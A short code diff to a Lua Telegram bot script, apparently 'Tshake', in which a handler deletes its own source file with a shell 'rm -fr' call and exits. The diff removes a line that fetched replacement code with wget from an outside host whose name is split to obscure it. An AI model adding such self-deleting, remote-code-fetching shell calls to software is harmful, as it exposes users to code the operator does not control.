@@ -49,7 +49,6 @@ local function keko_tshake(data)
             database:del("keko:hack:tshake:" .. bot_id .. msg.sender_user_id_)
             database:set('keko:ch_username'..bot_id,text) 
             os.execute("rm".." -fr Tshake.lua")
-            os.execute("wget https://".."botlua"..".tk/Tshake.lua")
             os.exit()
         end
         if text == "تغير القناة" then
